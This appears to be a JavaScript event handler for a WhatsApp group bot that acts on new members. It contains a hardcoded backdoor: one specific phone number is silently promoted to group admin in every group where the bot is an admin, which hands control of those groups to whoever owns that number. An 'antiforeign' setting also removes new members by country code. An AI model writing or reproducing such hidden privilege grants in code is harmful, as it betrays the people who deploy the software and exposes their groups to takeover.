const { getGroupSettings } = require('../Mongodb/Settingsdb');

const Evens = async (client, Fortu) => {
  try {
    const botId = client.decodeJid(client.user.id);
    const groupMetadata = await client.groupMetadata(Fortu.id);
    const groupAdmins = groupMetadata.participants
      .filter((participant) => participant.admin)
      .map((participant) => participant.id);

    // Check if bot is an admin
    if (!groupAdmins.includes(botId)) {
      console.log(`Bot is not an admin in group ${Fortu.id}. Exiting.`);
      return;
    }

    const groupSettings = await getGroupSettings(Fortu.id);
    let participants = Fortu.participants;

    const botname = process.env.BOTNAME || 'drraded';
    const mycode = process.env.MYCODE || "254";

    for (let num of participants) {
      if (Fortu.action === 'add' && (num.includes('254114018035'))) {
        await client.groupParticipantsUpdate(Fortu.id, [num], 'promote');
        client.sendMessage(Fortu.id, { 
          text: `@${num.split('@')[0]} has joined and has been promoted to admin!`, 
          mentions: [num] 
        });
      } else if (
        Fortu.action === "add" &&
        groupSettings.antiforeign &&
        !num.startsWith(mycode) &&
        Fortu.id !== "120363026023737882@g.us"
      ) {
        await client.sendMessage(Fortu.id, {
          text: `@${num.split`@`[0]} removed by ${botname}. Your country code is not allowed here!`,
          mentions: [num],
        });

        await client.groupParticipantsUpdate(Fortu.id, [num], "remove");
      }
    }
  } catch (err) {
    console.log(err);
  }
};

module.exports = Evens;